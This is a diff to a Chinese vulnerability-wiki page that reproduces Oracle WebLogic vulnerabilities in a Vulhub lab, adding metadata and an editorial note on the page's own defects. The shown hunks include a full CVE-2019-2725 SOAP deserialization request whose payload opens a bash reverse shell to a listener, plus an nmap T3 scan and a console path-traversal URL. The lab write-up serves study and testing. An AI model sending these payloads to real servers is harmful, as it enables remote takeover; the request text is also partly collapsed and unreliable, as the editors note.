@@ -1,8 +1,61 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "干货 - 最全的 Weblogic 漏洞复现"
+product: "Oracle WebLogic"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2020-14882; CVE-2020-14883"
+referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3248; CVE-2018-2893"
+identifier_role: "primary"
+cve: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2020-14882; CVE-2020-14883"
+prerequisites: "Vulhub deliberately weak credentials, multiple unpatched SOAP/T3/Console branches and enabled test pages"
+source_url: "https://mp.weixin.qq.com/s/rxDUTzjWQ6ybMbGsGHk6_Q"
+source_status: "recorded"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-3b3fd699091bc82a7817b874"
+entity_id: "ve-3b3fd699091bc82a7817b874"
+schema_version: "1"
 ---
 
 # 干货 - 最全的 Weblogic 漏洞复现
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Vulhub deliberately weak credentials, multiple unpatched SOAP/T3/Console branches and enabled test pages
+- 证据范围：Independent tutorial/source commentary shares standard lab content but is not a literal duplicate. Strong image dependence and severe one-line code loss.
+
+### 本次正文校订
+
+- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- All endpoint lists concatenated into one invalid path
+- Python client entire file collapsed after shebang, not executable source
+- 2725 GET-with-SOAP-body request collapsed, duplicate headers, missing XML attribute spacing and unescaped ampersands
+- 2725 text vaguely describes bypassing its own fix, losing distinction with later bypass
+- Enabling Web Service Test Page does not switch domain into development mode
+- 14882 section omits14883 and falsely calls touch-created file a directory
+- Docker commands concatenated; Spring XML begins #comment syntax and filename reverse-bash.xml differs test.xml
+- Five-attempt lockout and current12c claims need historical/config qualifiers
+- No remediation section for most vulnerabilities or cleanup of persistent artifacts
+- Advertisement and repeated recommendations should be trimmed
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rxDUTzjWQ6ybMbGsGHk6_Q)
@@ -208,7 +261,7 @@ wls-wsat 反序列化漏洞 (CVE-2019-2725)。攻击者可以发送精心构造�
 
 bp 在当前页面抓包，使用 bash 命令反弹 shell，nc 开启端口监听即可
 
-```
+```http
 GET /_async/AsyncResponseService HTTP/1.1Host: 192.168.1.10:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 782Accept-Encoding: gzip, deflateSOAPAction:Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/192.168.1.2/5555 0>&1</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
@@ -235,7 +288,7 @@ WebLogic T3 协议反序列化命令执行漏洞 (CVE-2018-2628)。Oracle WebLog
 
 这里先使用 nmap 扫描一下是否开启了 WebLogic T3 服务
 
-```
+```shell
 nmap -n -v -p 7001,7002 192.168.1.10 --script=weblogic-t3-info
 ```
 
@@ -282,7 +335,7 @@ ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.cla
 
 这里我们首先打开 docker 的开发环境。这里因为不是弱口令的 docker，所以这里我们执行命令看一下进入后台的密码
 
-```
+```shell
 docker-compose logs | grep password
 ```
 
@@ -379,7 +432,7 @@ http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true
 
 我们进入 docker 查看发现文件夹已经创建成功了
 
-```
+```shell
 docker pssudodocker exec -it b6a1b6c3e4d1 /bin/bash
 ```
 
